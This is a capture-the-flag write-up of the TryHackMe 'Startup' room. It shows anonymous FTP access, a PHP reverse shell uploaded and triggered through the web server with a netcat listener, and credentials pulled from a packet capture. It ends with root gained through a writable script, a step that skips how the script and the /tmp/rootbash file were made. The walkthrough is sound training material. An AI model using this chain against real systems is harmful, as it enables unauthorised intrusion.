---
title: "Challenges: Startup (TryHackMe)"
datePublished: Sun Jul 20 2025 20:18:42 GMT+0000 (Coordinated Universal Time)
cuid: cmdc4dhhy001902kzgt2shypz
slug: challenges-startup-tryhackme
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1753042710603/9899fc99-d4a3-42bd-887c-f2867e7ab6ba.png
tags: ftp, tryhackme, pcap, wireshark, ctf-writeup, privilege-escalation

---

Welcome to *Spice Hut*, a quirky startup that sells spices and sandwiches—but more importantly, has questionable security practices. As part of a penetration testing engagement, our goal was to assess their infrastructure and attempt full system compromise. From initial enumeration to gaining root access, this box tested a wide range of fundamental skills, including service enumeration, steganography, reverse shells, PCAP analysis, and privilege escalation via weak scripting logic.

This write-up summarizes the full exploit chain used during the engagement, the vulnerabilities discovered, and key lessons learned throughout the process.

## Welcome to Spice Hut!

**We are Spice Hut,** a new startup company that just made it big! We offer a variety of spices and club sandwiches (in case you get hungry), but that is not why you are here. To be truthful, we aren't sure if our developers know what they are doing and our security concerns are rising. We ask that you perform a thorough penetration test and try to own root. Good luck!

### Answer the questions below

1. What is the secret spicy soup recipe?  
      
    `nmap -sC -sV IP_Address`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753035837046/9b762281-303d-4ba5-8e55-bb224d247b73.png align="center")
    
    `ftp IP_Address`  
    Anonymous  
    
    `get notice.txt`  
    
    `get important.jpg`  
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753035922142/76219f8c-da58-447d-a354-c8d7a1b50ea0.png align="center")
    
    `cat notice.txt`
    
    ```plaintext
    Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus
    ```
    
    `sudo pip3 install capstone==4.0.2`  
      
    `binwalk -e important.jpg`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753036022183/79b2d0a1-0b5e-4588-bbed-4cbfd51d35da.png align="center")
    
      
    the image sort of a meme
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753036207181/7ce752a4-43df-467a-b0a9-b5b083310f66.png align="center")
    
    we’re going to copy a reverse shell php file the upload it to ftp then we’ll use to get initial user access  
      
    `cp /usr/share/webshells/php/php-reverse-shell.php shell.php`  
      
    `nano shell.php`  
      
    edit the IP\_Address and Port  
      
    log back to ftp then use this command:  
      
    `ftp IP_Address`  
      
    `put shell.php`  
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753036309652/e5f8cbe0-37c7-45b3-96be-d8f1da3ecab0.png align="center")
    
    `nc -lvnp 4444`  
      
    go to the `http://IP_Address/files/ftp/` and click on `shell.php` file
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753036508246/607bd228-9f65-496c-8a9a-02e167fbf7bc.png align="center")
    
    the shell will be reversed:
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753037636956/a9eb3434-3a11-47e6-90a4-6fc2e49dbd38.png align="center")
    
    switch to fully interactive TTY shell  
      
    `python3 -c 'import pty; pty.spawn("/bin/bash")'`  
      
    we found a `recipe.txt` file that reveals the recipe
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753037931546/64d6c5b8-0c1b-4b69-8792-b71f7950af63.png align="center")
    
2. What are the contents of user.txt?  
      
    back to ftp there’s an ftp folder that we had missed and checking the folder it has a pcapng file that will help us move on in this step  
      
    `ftp IP_Address`  
      
    `get suspicious.pcapng`  
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753038261293/cd6c4506-6df0-4021-83c9-fd257b1f3220.png align="center")
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753038187835/91698a71-83aa-4ab7-84ad-35cfe13862eb.png align="center")
    
    open the pcappng file using Wireshark
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753038406733/cbdf96fc-d893-4cb4-96d3-9fc85a778dfb.png align="center")
    
    select one with TCP protocol and click on Analyze then select follow and TCP Stream then keep changing the streams, stream 7 and look through  
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753038434305/915ca198-db41-41b4-8048-a4db616c519e.png align="center")
    
      
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753038457954/c7f293c6-a082-4e02-a2db-c32f6b8b2056.png align="center")
    
      
    we have a user called lennie and password, we can use ssh to access the user flag
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753038490383/e4ef166b-f7fe-469d-ace3-d7204d3c6e07.png align="center")
    
    `ssh lennie@IP_Address`  
      
    `find / -type f -name user.txt 2> /dev/null`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753038806532/c88665e6-e866-428b-aa62-523cc01b2d11.png align="center")
    
3. What are the contents of root.txt?  
      
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753039606668/9e89f150-46af-4c67-b95d-ac3dc9ba135f.png align="center")
    
    `cd scripts/`  
      
    `cat planner.sh`
    
    ```plaintext
    #!/bin/bash 
    echo $LIST > /home/lennie/scripts/startup_list.txt
    /etc/print.sh
    ```
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753039739300/890b81da-d4b9-4e6b-92cc-f330d0798b79.png align="center")
    
    `ls -lah /etc/print.sh`
    
    /etc$ `chmod +x print.sh`  
      
    /$ `/tmp/rootbash -p`
    
      
    \# `find / -type f -name root.txt 2> /dev/null`  
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1753039759461/3eeceb35-6bef-44bf-aca6-9f6d20473db1.png align="center")
    
      
      
    

## Credits

Spice Hut was very happy with your results and it is guaranteed they will spread word about your excellence with their partners. Astounding work!

![](https://houstonchildrenscharity.org/wp-content/uploads/2016/03/thank.jpg align="left")

Find my official writeup here: [https://www.youtube.com/watch?v=3qNxI1OggGc](https://www.youtube.com/watch?v=3qNxI1OggGc)

I'd like to thank [**ku5e**](https://tryhackme.com/p/ku5e) for being a good sensei and [**GeneralClaw**](https://tryhackme.com/p/GeneralClaw), my grammar cop.

I'd like to thank my testers  [**Amit25095**](https://tryhackme.com/p/Amit25095), [**BarZigmon**](https://tryhackme.com/p/BarZigmon) and [**powershot**](https://tryhackme.com/p/powershot).

Additionally, I'd love to thank **TryHackMe** not just for their platform, of which has changed my life, but for giving me this opportunity to give back to the community.

And of course, I'd like to thank **you** for playing. Hope to see you soon!  
  

This box was an excellent showcase of practical penetration testing skills. From basic enumeration and file analysis to privilege escalation via insecure script execution, *Spice Hut* reinforces the importance of:

* Disabling anonymous FTP access in production environments.
    
* Avoiding hardcoded or plaintext credentials.
    
* Reviewing file and directory permissions, especially scripts run by privileged users.
    
* Analyzing network captures for leaked sensitive information.
    

While the memes and quirky dialogue made the journey fun, the security flaws were very real—and could easily be exploited in a real-world scenario. Spice Hut has since taken your advice seriously, and with your help, they’ve now hired a proper security team. 🍜